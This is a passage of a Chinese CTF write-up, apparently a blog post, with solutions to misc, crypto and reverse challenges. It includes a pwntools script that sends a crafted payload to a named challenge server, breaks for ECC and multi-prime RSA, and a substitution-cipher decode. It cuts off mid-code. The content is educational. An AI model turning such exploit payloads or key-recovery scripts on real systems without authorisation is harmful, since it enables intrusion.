为例，即</p><p><code>452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e01+452/4520e01+452/4520e01+452/4520e01+452/4520e02+452/4520e02+452/4520e02</code></p><p>接下来寻找满足base64特性（编码：每3字符→4字符，解码：每4字符→3字符）并且编解码一致的<code>e+数字</code>串，有：</p><p><code>e00+</code>对应<code>&#123;M&gt;</code>，<code>e01+</code>对应<code>&#123;M~</code>，<code>e04+</code>对应<code>&#123;N&gt;</code>，<code>e05+</code>对应<code>&#123;N~</code>，<code>e08+</code>对应<code>&#123;O&gt;</code>，<code>e09+</code>对应<code>&#123;O~</code>，<code>e10+</code>对应<code>&#123;]&gt;</code>，<code>e11+</code>对应<code>&#123;]~</code>，<code>e013</code>对应<code>&#123;Mw</code>。</p><p>将生成值按上面公式拆解，替换为对应特征串，nc交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#注意py2和py3关于float值的输出长度不同，py2输出值过短会导致误差不满足要求，此用py3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;111.231.70.44&#x27;</span>, <span class="number">28044</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Back luck 2021???&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">num = r.recvline().strip(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line">num = num.split(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line">a = <span class="built_in">int</span>(num[<span class="number">0</span>])</span><br><span class="line">b = num[<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = &#123;<span class="string">&#x27;0.1/&#x27;</span>: <span class="string">&#x27;㝿㝴&#x27;</span>, <span class="string">&#x27;e00+&#x27;</span>: <span class="string">&#x27;&#123;M&gt;&#x27;</span>, <span class="string">&#x27;e01+&#x27;</span>: <span class="string">&#x27;&#123;M~&#x27;</span>, <span class="string">&#x27;e04+&#x27;</span>: <span class="string">&#x27;&#123;N&gt;&#x27;</span>, <span class="string">&#x27;e05+&#x27;</span>: <span class="string">&#x27;&#123;N~&#x27;</span>, <span class="string">&#x27;e08+&#x27;</span>: <span class="string">&#x27;&#123;O&gt;&#x27;</span>, <span class="string">&#x27;e09+&#x27;</span>: <span class="string">&#x27;&#123;O~&#x27;</span>, <span class="string">&#x27;e10+&#x27;</span>: <span class="string">&#x27;&#123;]&gt;&#x27;</span>, <span class="string">&#x27;e11+&#x27;</span>: <span class="string">&#x27;&#123;]~&#x27;</span>, <span class="string">&#x27;e013&#x27;</span>: <span class="string">&#x27;&#123;Mw&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&quot;0.1/e00+&quot;</span>*(a*<span class="number">10</span>+<span class="built_in">int</span>(b[<span class="number">0</span>]))</span><br><span class="line">payload += <span class="string">&quot;0.1/e01+&quot;</span>*(<span class="built_in">int</span>(b[<span class="number">1</span>]))</span><br><span class="line">payload += <span class="string">&quot;0.1/e04+&quot;</span>*(<span class="built_in">int</span>(b[<span class="number">2</span>:<span class="number">5</span>]))</span><br><span class="line">payload += <span class="string">&quot;0.1/e05+&quot;</span>*(<span class="built_in">int</span>(b[<span class="number">5</span>]))</span><br><span class="line">payload += <span class="string">&quot;0.1/e08+&quot;</span>*(<span class="built_in">int</span>(b[<span class="number">6</span>:<span class="number">9</span>]))</span><br><span class="line">payload += <span class="string">&quot;0.1/e09+&quot;</span>*(<span class="built_in">int</span>(b[<span class="number">9</span>]))</span><br><span class="line">payload += <span class="string">&quot;0.1/e10+&quot;</span>*(<span class="built_in">int</span>(b[<span class="number">10</span>]))</span><br><span class="line">payload += <span class="string">&quot;0.1/e11+&quot;</span>*(<span class="built_in">int</span>(b[<span class="number">11</span>]))</span><br><span class="line">payload += <span class="string">&quot;0.1/e013&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload), <span class="number">4</span>):</span><br><span class="line">    data+=table[payload[i:i+<span class="number">4</span>]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(b64encode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))))</span><br><span class="line">r.sendline(data)</span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>出题思路来自<a href="https://ctftime.org/task/12283">TSG CTF 2020 - Beginner’s Misc</a>，此题不止一种方法，欢迎分享其他做法。</p><p>​    </p><h3 id="eccsimiscce"><a href="#eccsimiscce" class="headerlink" title="eccsimiscce"></a>eccsimiscce</h3><blockquote><p>初探ecc。Be patient!</p><p>hint: 注意看一下题目名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">n</span>):</span></span><br><span class="line">g = []</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(g) &lt; <span class="number">2</span>:</span><br><span class="line">r = getrandbits(<span class="number">128</span>)</span><br><span class="line"><span class="keyword">if</span> r &lt; n:</span><br><span class="line">g += [r]</span><br><span class="line"><span class="keyword">return</span> g[<span class="number">0</span>], g[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">pt = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">6</span> + long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(pt) % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">o = <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">n = getPrime(<span class="number">64</span>) * getPrime(<span class="number">64</span>)</span><br><span class="line">o.write(<span class="built_in">str</span>(n) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">a, b = gen(n)</span><br><span class="line"></span><br><span class="line">p = []</span><br><span class="line">E = EllipticCurve(IntegerModRing(n), [a, b^<span class="number">2</span>])</span><br><span class="line">P = E((<span class="number">0</span>, b))</span><br><span class="line">p += [P.xy()]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pt) // <span class="number">8</span>):</span><br><span class="line">Q = bytes_to_long(pt[<span class="number">8</span> * k : <span class="number">8</span> * k + <span class="number">8</span>]) * P</span><br><span class="line">p += [Q.xy()]</span><br><span class="line">P = Q</span><br><span class="line">o.write(<span class="built_in">str</span>(p))</span><br></pre></td></tr></table></figure></blockquote><p>简单ECDLP（椭圆曲线离散对数问题）。</p><p>将flag二进制值对应字符串在前面补充6个<code>&#39;\x00&#39;</code>后，以8个字节一组通过ECC倍乘加密，得到的点 $Q$ 再作为下一组的基点 $P$ 继续倍乘，以此类推。</p><p>依次对每一组求解ECDLP问题，即给定2个素数 $p,q$ 的乘积 $n=pq$，已知生成元 $P$ 和积 $Q=m_iP$，求 $m_i$。</p><p>$n$ 是一个合数，根据<a href="https://crypto.stackexchange.com/questions/72613/elliptic-curve-discrete-log-in-a-composite-ring">Elliptic Curve Discrete Log in a Composite Ring</a>，可以将其分解成模 $p$ 和模 $q$ 上的两条曲线，然后再在这两条曲线上分别求解DLP，最后通过CRT算法即可得到模 $n$ 下的解。</p><p>由于DLP的运行时长取决于ECC的光滑度，且由输出的点列表知有211个8字节串，总运行时间会比较长（Be patient）。</p><p>解出所有8字节串，连接发现是很长的01串，结合hint发现题目<code>eccsi[misc]ce</code>里含有<code>misc</code>，且$(211 \cdot 8-6)\cdot8=13456=(2^2\cdot29)^2$ 为完全平方数，猜测为二维码，将01串转化为图片扫码得flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"></span><br><span class="line">n=</span><br><span class="line">point=[]</span><br><span class="line"></span><br><span class="line">x1,y1=point[<span class="number">0</span>]</span><br><span class="line">x2,y2=point[<span class="number">1</span>]</span><br><span class="line">a=(((y2^<span class="number">2</span>-y1^<span class="number">2</span>)-(x2^<span class="number">3</span>-x1^<span class="number">3</span>))%n*inverse_mod(x2-x1,n))%n</span><br><span class="line">b=y1</span><br><span class="line"></span><br><span class="line"><span class="comment">#factor(n)</span></span><br><span class="line">p=<span class="number">12117702104890171579</span></span><br><span class="line">q=<span class="number">16627969210850438723</span></span><br><span class="line"></span><br><span class="line">flag01=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(point)):</span><br><span class="line"><span class="built_in">print</span>(i-<span class="number">1</span>,i)</span><br><span class="line">G=point[i-<span class="number">1</span>]</span><br><span class="line">K=point[i]</span><br><span class="line">Ep=EllipticCurve(GF(p),[a,b^<span class="number">2</span>])</span><br><span class="line">Eq=EllipticCurve(GF(q),[a,b^<span class="number">2</span>])</span><br><span class="line">xp=discrete_log(Ep(K),Ep(G),operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">xq=discrete_log(Eq(K),Eq(G),operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">x=crt([ZZ(xp),ZZ(xq)],[ZZ(Ep(K).order()),ZZ(Eq(K).order())])</span><br><span class="line">m=<span class="built_in">bin</span>(x)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag01+=m</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag01)</span><br><span class="line"></span><br><span class="line"><span class="comment">#01串转图片略</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="大佬们帮我看看我这个Python脚本为什么运行不了啊"><a href="#大佬们帮我看看我这个Python脚本为什么运行不了啊" class="headerlink" title="大佬们帮我看看我这个Python脚本为什么运行不了啊"></a>大佬们帮我看看我这个Python脚本为什么运行不了啊</h3><blockquote><p>菜鸡 9:36:27<br>菜鸡上传了文件 新建文本文档.py</p><p>菜鸡 9:37:02<br>key1: Do you want a DaJiBei?</p><p>菜鸡 9:37:61<br>大佬们帮我看看我这个Python脚本为什么运行不了啊</p><p>hint1: 最终结果是自带flag格式的，可以据此判断结果是否正确，不必浪费时间尝试提交格式</p><p>hint2: 为什么运行结果里好好的3，也要写成大小写混乱的样子？</p><p>hint3: 如果某个方向已经找不到更多的线索，不妨回头看看来时的道路</p><p>hint4: 本题的加密方式来源于对以下问题的思考：如何在同一个载体上加密两段信息，且读取其中一种信息的过程会令另一种信息被破坏；并且，如果前一种信息的读取方式足够显而易见，是否可以在有限的短时间内尽可能转移注意力，减少非预期接收者发现另一段信息的可能性？<br>为了降低难度，本题在选择每一种信息的加密方式时，尽可能选择了复杂度较低的做法；同时，将其中一段信息（相信大家都已经找到这一段了）设计为另一段信息加密方式的提示。</p><p>hint5: 3对应<code>...--</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fROM CRYPTO.utIL.NuMBER IMPORT BYteS_TO_LoNG, long_TO_BYTES</span><br><span class="line"></span><br><span class="line">A_Fake_FLaG = <span class="string">B&#x27;FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;&#x27;</span></span><br><span class="line">nuMBER = bYTEs_tO_long(a_FAKE_FLAG)</span><br><span class="line"></span><br><span class="line">KeY1 = <span class="string">B&#x27;DO yOU WAnT A DAJIBEI?&#x27;</span></span><br><span class="line">KEY1 = Bytes_to_lONG(KEY1)</span><br><span class="line"></span><br><span class="line">KEY2 = <span class="number">0XBCD2deE7E7114B5C856F8DAECeD0782BD891200B4D8264D854A13D53cF1F0c481b</span></span><br><span class="line">iv = <span class="number">10800</span></span><br><span class="line">KEY3 = KeY2 * IV</span><br><span class="line"></span><br><span class="line">IS_THIS_rEAL_FlAG = (NUmber + kEY3) // KEy1</span><br><span class="line"><span class="built_in">print</span>(long_tO_bytes(IS_THis_REAl_flag))</span><br></pre></td></tr></table></figure></blockquote><p>新颖的题目设计，将真正信息藏于易读信息里，视觉第一影响大脑，接收先入信息以减少其他信息被注意的可能，有种首因效应的意味。</p><p>根据题面知真正的<code>key1=&#39;Do you want a DaJiBei?&#39;</code>，修正除<code>&#39;FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;&#39;</code>外的字母大小写，运行脚本得到输出结果为<code>thrEE_means_3</code>，结合hint5知应该是摩斯密码，赛时连蒙带猜猜中flag，下来询问出题者@cheyenne预期解为，将代码全文大小写分别转换为<code>.</code>和<code>-</code>后解密得flag。</p><p>​    </p><h3 id="单表加密"><a href="#单表加密" class="headerlink" title="单表加密"></a>单表加密</h3><blockquote><p>替换式密码，又名取代加密法，是密码学中按规律将文字加密的一种方式。替换式密码仅对明文中字符组成的单元进行替换，但密文中单元的位置没有改变。如果每一个字符为一单元进行加密操作，就称之为“简易替换密码”或“单表加密”。一种单表加密的做法是事先约定一份文本作为密码本，并根据文本内容和特征对明文进行替换加密。由于密码本仅提供给非常重要的人士，在一定程度上增加了密码的安全性。据称，在我国古代，苏州一带的当铺曾经大量使用此类密码。注意：古代苏州当铺的伙计不认识拉丁字母、阿拉伯数字和标点符号，所以当时的密码本仅使用汉字</p><p>hint1: 做题时不要老是上外部网站。</p><p>hint2: 密码本可能会在2月10日进行一次较大的更新。</p><p>hint3: 想一想，那个把数字加密成汉字的替换密码的实质是什么？</p><p>hint4: 密码本：请点击页面最上方的VIP</p></blockquote><p>苏州码子+ctfshow vip页密码本+当铺密码。</p><p>第一步，将word中苏州码子替换为数字。</p><p>第二步，到<a href="https://vip.ctf.show/，将上一步每行数字按照`模块数+行数+第几个字`方式取出对应的字。">https://vip.ctf.show/，将上一步每行数字按照`模块数+行数+第几个字`方式取出对应的字。</a></p><p>第三步，数每个汉字有多少笔画出头，就是转化成16进制的数字几。</p><p>最后得到的16进制串转字符串即为flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dic=&#123;<span class="string">&#x27;11&#x27;</span>:<span class="string">&#x27;什么是会员&#x27;</span>,<span class="string">&#x27;12&#x27;</span>:<span class="string">&#x27;平台自开通以来凭借着众多优秀的原创题目与活跃和谐的社区环境受到了广大的一致好评但是近几&#x27;</span>,<span class="string">&#x27;21&#x27;</span>:<span class="string">&#x27;会员有什么特权&#x27;</span>,<span class="string">&#x27;22&#x27;</span>:<span class="string">&#x27;会员目前针对平台入门系列题目开通会员后可以解锁全部道题目同时由平台技术&#x27;</span>,<span class="string">&#x27;41&#x27;</span>:<span class="string">&#x27;题目有哪些内容&#x27;</span>,<span class="string">&#x27;42&#x27;</span>:<span class="string">&#x27;入门系列题目采用循序渐进的方式逐步开放题栈如下&#x27;</span>,<span class="string">&#x27;61&#x27;</span>:<span class="string">&#x27;会员开通价格&#x27;</span>,<span class="string">&#x27;62&#x27;</span>:<span class="string">&#x27;平台题目绝大部分都是原创题目出题师傅们付出了辛勤的劳动考虑到学习的大部分还是以学生为主&#x27;</span>,<span class="string">&#x27;71&#x27;</span>:<span class="string">&#x27;会员价格元还是感觉贵了怎么办&#x27;</span>,<span class="string">&#x27;72&#x27;</span>:<span class="string">&#x27;这个确实还是个问题所以笔者建议经济实力不够的同学可以联系两三个好友合买一个号目前支付宝支持分期和花呗&#x27;</span>,<span class="string">&#x27;81&#x27;</span>:<span class="string">&#x27;如何支付开通会员&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">x=[<span class="number">613</span>,<span class="number">613</span>,<span class="number">613</span>,<span class="number">225</span>,<span class="number">613</span>,<span class="number">2231</span>,<span class="number">613</span>,<span class="number">6239</span>,<span class="number">6239</span>,<span class="number">7235</span>,<span class="number">4223</span>,<span class="number">723</span>,<span class="number">421</span>,<span class="number">4223</span>,<span class="number">613</span>,<span class="number">6224</span>,<span class="number">813</span>,<span class="number">2222</span>,<span class="number">4223</span>,<span class="number">225</span>,<span class="number">421</span>,<span class="number">2231</span>,<span class="number">813</span>,<span class="number">2222</span>,<span class="number">4223</span>,<span class="number">4223</span>,<span class="number">813</span>,<span class="number">813</span>,<span class="number">813</span>,<span class="number">2222</span>,<span class="number">4223</span>,<span class="number">6239</span>,<span class="number">6239</span>,<span class="number">813</span>,<span class="number">421</span>,<span class="number">1219</span>,<span class="number">813</span>,<span class="number">2222</span>,<span class="number">4223</span>,<span class="number">6239</span>,<span class="number">613</span>,<span class="number">2231</span>,<span class="number">4223</span>,<span class="number">2222</span>,<span class="number">6239</span>,<span class="number">7249</span>]</span><br><span class="line"></span><br><span class="line">word=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> x:</span><br><span class="line">s=<span class="built_in">str</span>(k)</span><br><span class="line">key=s[:<span class="number">2</span>]</span><br><span class="line">index=<span class="built_in">int</span>(s[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(index)</span><br><span class="line">word+=dic[key][index-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(word)</span><br><span class="line"><span class="comment">#开开开针开由开以以买下确入下开勤支解下针入由支解下下支支支解下以以支入目支解下以开由下解以花</span></span><br><span class="line"><span class="comment">#666c61677b48346e5f4c315f44555f4775305f47614f7d</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="RealSimpleAlgorithm"><a href="#RealSimpleAlgorithm" class="headerlink" title="RealSimpleAlgorithm"></a>RealSimpleAlgorithm</h3><blockquote><p>So real, so simple…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findPrime</span>(<span class="params">k</span>):</span></span><br><span class="line"><span class="keyword">return</span> k <span class="keyword">if</span> isPrime(k) <span class="keyword">else</span> findPrime(k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = findPrime(<span class="number">20210123</span> * p * p)</span><br><span class="line">r = findPrime(p * q * q)</span><br><span class="line">s = findPrime(p * q * r)</span><br><span class="line">n = p * q * r * s</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">w = <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">w.write(long_to_bytes(n))</span><br><span class="line">w.write(<span class="string">b&#x27;\n\n&#x27;</span>)</span><br><span class="line">w.write(long_to_bytes(<span class="built_in">pow</span>(m, e, n)))</span><br></pre></td></tr></table></figure></blockquote><p>RSA签到题，考察<code>next_prime</code>特性。</p><blockquote><p>根据素数定理，素数的平均间隔为：$\cfrac{x}{\pi(x)} \approx \ln(x)$，因此常见的下一个素数比当前素数大一点，一般不会超过1500。</p></blockquote><p>由于素数间隔不会超1500，故：</p><p>$q\approx 20210123 \cdot p^2$</p><p>$r\approx p \cdot q^2 \approx 20210123^2 \cdot p^5$</p><p>$s \approx p \cdot q \cdot r \approx 20210123^3 \cdot p^8$</p><p>$n \approx p \cdot q \cdot r \cdot s \approx 20210123^6 \cdot p^{16}$</p><p>以开方取整得到的值开始爆破 $p$ ，再分别求出对应的 $q,r,s$，基本RSA操作即可得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n=</span><br><span class="line">c=</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal</span>(<span class="params">p</span>):</span></span><br><span class="line">q=gmpy2.next_prime(<span class="number">20210123</span>*p*p)</span><br><span class="line">r=gmpy2.next_prime(p*q*q)</span><br><span class="line">s=gmpy2.next_prime(p*q*r)</span><br><span class="line"><span class="keyword">return</span> p*q*r*s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findp</span>(<span class="params">p,n</span>):</span></span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">nx=cal(p)</span><br><span class="line"><span class="keyword">if</span> nx&lt;n:</span><br><span class="line">p=gmpy2.next_prime(p+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="comment">#n ~ (20210123**6)*(p**16)</span></span><br><span class="line">approx=gmpy2.iroot(n//<span class="built_in">pow</span>(<span class="number">20210123</span>,<span class="number">6</span>),<span class="number">16</span>)[<span class="number">0</span>]</span><br><span class="line">p=findp(approx,n)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">q=gmpy2.next_prime(<span class="number">20210123</span>*p*p)</span><br><span class="line">r=gmpy2.next_prime(p*q*q)</span><br><span class="line">s=gmpy2.next_prime(p*q*r)</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)*(s-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(<span class="number">0x10001</span>,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="A-Maze-In"><a href="#A-Maze-In" class="headerlink" title="A-Maze-In"></a>A-Maze-In</h3><blockquote><p>真·签到</p></blockquote><p>迷宫题。</p><p>注意函数<code>sub_4011B0()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4011B0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> x; <span class="comment">// bl@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 j; <span class="comment">// dl@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// esi@2</span></span><br><span class="line">  <span class="keyword">char</span> c; <span class="comment">// al@3</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// ecx@4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// esi@19</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span 